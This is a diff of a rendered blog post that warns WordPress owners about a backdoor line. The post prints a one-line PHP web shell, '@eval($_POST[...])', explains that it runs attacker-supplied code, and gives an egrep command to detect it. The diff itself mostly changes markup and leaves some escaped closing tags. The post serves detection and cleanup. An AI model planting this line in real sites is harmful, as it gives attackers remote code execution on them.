@@ -14,6 +14,7 @@
   <meta name="description" content="tl;dr: If you find this line of code in any files of your WordPress install, get worried, get rid of it immediately.">
 
   <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="/css/prism.css">
   <link rel="canonical" href="http://tldrdevnotes.com/sysadmin/code-injection-attacks.html">
   <link rel="alternate" type="application/rss+xml" title="TLDR Dev Notes" href="http://tldrdevnotes.com/feed.xml">
   <link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css'>
@@ -74,14 +75,14 @@
 
     <div class="page-content">
       <div class="wrapper">
-        <article class="Post" itemscope itemtype="http://schema.org/BlogPosting">
+        <article class="Post" itemscope="" itemtype="http://schema.org/BlogPosting">
 
   <header class="Post-header">
     <h1 class="Post-title" itemprop="name headline">Code Injection Attacks in WordPress</h1>
     <p class="Post-meta">
       
       
-      <span class='ctime'>Created
+      <span class="ctime">Created
         <time datetime="2017-07-05T00:00:00+05:00" itemprop="datePublished">
           Jul 5, 2017
         </time>
@@ -91,47 +92,61 @@
       
 
       <!---->
-      <span style='float:right'><a href="https://github.com/aamnah/tldrdevnotes.com/blob/master/_sysadmin/code-injection-attacks.md" target='_blank'>Edit this page on Github</a>
-    </p>
+      <span style="float:right"><a href="https://github.com/aamnah/tldrdevnotes.com/blob/master/_sysadmin/code-injection-attacks.md" target="_blank">Edit this page on Github</a>
+    &lt;/p&gt;
     
-      <ul class='tags'>
+      <ul class="tags">
       
       </ul>
     
-  </header>
+  &lt;/header&gt;
 
   <div class="Post-content" itemprop="articleBody">
     <p>tl;dr: If you find this line of code in any files of your WordPress install, get worried, <strong>get rid of it immediately</strong>.</p>
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'@01'</span><span class="p">]);</span><span class="cp">?&gt;</span>
-</code></pre></div>
+
+<pre><code class="language-php">&lt;?php @eval($_POST['@01']);?&gt;
+</code></pre>
+
 <blockquote>
-<p>With this line of code, the hacker will be able to <strong>execute any code he wants</strong>. Therefore this code will have the power to <strong>read, update or delete any data he wants</strong>.</p>
-
-<p>We don&#39;t know yet what code he will choose to execute because the code will be passed as a <code>$_POST</code> argument. The <code>$_POST[1]</code> argument will contain a string of executable code. Then, <code>eval()</code> will be called with this argument to execute that code.</p>
-
-<p>When the hacker will call your page, passing it some code as a POST argument, he will be performing an attack that is called <strong>code injection</strong>.</p>
-
-<p>Now that you know that, you have to figure out:</p>
-
-<ol>
-<li>What <strong>damage</strong> has already been done in order to undo it, if possible?</li>
-<li>What <strong>security breach</strong> allowed the hacker to add the &quot;eval&quot; code to your code base?</li>
-</ol>
-
-<p>If you decide to restore a backup, make sure the &quot;eval&quot; code is not already in your backup. Then, solve problem #2 because the hacker will probably just re-use the same security breach to restore his hack. Even if your backup is clean, the security breach will still be there.</p>
+  <p>With this line of code, the hacker will be able to <strong>execute any code he wants</strong>. Therefore this code will have the power to <strong>read, update or delete any data he wants</strong>.</p>
 </blockquote>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># egrep -lri '@eval' .</span>
-./public_html/wp-content/_themes/business-one-page/404.php
-</code></pre></div>
-<h2>Links</h2>
 
+<blockquote>
+  <p>We don’t know yet what code he will choose to execute because the code will be passed as a <code>$_POST</code> argument. The <code>$_POST[1]</code> argument will contain a string of executable code. Then, <code>eval()</code> will be called with this argument to execute that code.</p>
+</blockquote>
+
+<blockquote>
+  <p>When the hacker will call your page, passing it some code as a POST argument, he will be performing an attack that is called <strong>code injection</strong>.</p>
+</blockquote>
+
+<blockquote>
+  <p>Now that you know that, you have to figure out:</p>
+</blockquote>
+
+<blockquote>
+  <ol>
+    <li>What <strong>damage</strong> has already been done in order to undo it, if possible?</li>
+    <li>What <strong>security breach</strong> allowed the hacker to add the “eval” code to your code base?</li>
+  </ol>
+</blockquote>
+
+<blockquote>
+  <p>If you decide to restore a backup, make sure the “eval” code is not already in your backup. Then, solve problem #2 because the hacker will probably just re-use the same security breach to restore his hack. Even if your backup is clean, the security breach will still be there.</p>
+</blockquote>
+
+<pre><code class="language-bash"># egrep -lri '@eval' .
+./public_html/wp-content/_themes/business-one-page/404.php
+</code></pre>
+
+<h2 id="links">Links</h2>
 <ul>
-<li><a href="https://stackoverflow.com/questions/36374420/what-is-the-meaning-of-eval-post1">StackOverflow: What is the meaning of @eval($_POST[1])</a></li>
+  <li><a href="https://stackoverflow.com/questions/36374420/what-is-the-meaning-of-eval-post1">StackOverflow: What is the meaning of @eval($_POST[1])</a></li>
 </ul>
 
   </div>
 
-</article>
+&lt;/article&gt;
+</span></p></header></article>
 
       </div>
     </div>
@@ -177,6 +192,7 @@
   </div>
 
 </footer>
+<script src="/js/prism.js"></script>
 
     <script>
   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
